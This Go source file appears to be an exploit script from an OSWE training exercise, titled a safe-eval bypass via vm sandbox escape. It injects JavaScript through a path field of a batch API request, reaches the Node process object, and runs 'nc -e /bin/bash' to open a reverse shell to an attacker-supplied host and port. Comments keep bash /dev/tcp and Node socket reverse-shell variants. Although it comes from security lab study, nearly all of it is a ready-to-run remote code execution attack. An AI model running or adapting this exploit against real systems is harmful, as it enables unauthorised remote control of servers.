package main

import (
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 6.5.1.2 - Extra Mile: safe-eval bypass via vm sandbox escape

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func bypassSafeEval(debug bool, ip, lhost, lport string) {
	// do necessary URL manipulation
	requestURL := fmt.Sprintf("http://%s:8080/batch", ip)

	cmd := "const process = this.parts.constructor.constructor(\"return process\")();"
	// Failed:
	//cmd += fmt.Sprintf("process.mainModule.require(\"child_process\").exec(\"bash -i >& \\x2fdev\\x2ftcp\\x2f%s\\x2f%s 0>&1\");", lhost, lport)
	// Working:
	cmd += fmt.Sprintf("process.mainModule.require(\"child_process\").exec(\"nc -e \\x2fbin\\x2fbash %s %s\");", lhost, lport)
	// OR
	//cmd += "var require = process.mainModule.require;"
	//cmd += "var net = require(\"net\"),sh = require(\"child_process\").exec('\\x2fbin\\x2fbash');"
	//cmd += "var client = new net.Socket();"
	//cmd += fmt.Sprintf("client.connect(%s, \"%s\", function(){client.pipe(sh.stdin);", lport, lhost)
	//cmd += "sh.stdout.pipe(client);sh.stderr.pipe(client);});"

	jsonStruct := map[string]interface{}{
		"requests": []map[string]interface{}{
			{"method": "get", "path": "/profile"},
			{"method": "get", "path": "/item"},
			{"method": "get", "path": fmt.Sprintf("/item/$1.id;%s", cmd)},
		},
	}

	jsonData, err := json.Marshal(jsonStruct)
	if err != nil {
		log.Fatalln("Failed to marshal jsonStruct: ", err)
	}

	postRequest := utils.PostRequest{
		ContentType: "json",
		JsonData:    jsonData,
	}

	// send the request
	response := utils.SendPostRequest(client, debug, requestURL, postRequest)

	// check output of response
	if response.StatusCode != 200 {
		utils.PrintFailure("Something went wrong... Check proxy to debug!")
		os.Exit(1)
	}
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 4 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-debug=true] [-proxy=true] <target> <LHOST> <LPORT>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103 192.168.45.152 1337", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)
	lHost := flag.Arg(1)
	lPort := flag.Arg(2)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{
		Transport: tr,
	}

	bypassSafeEval(*debug, ip, lHost, lPort)
	utils.PrintSuccess("Done!")
}
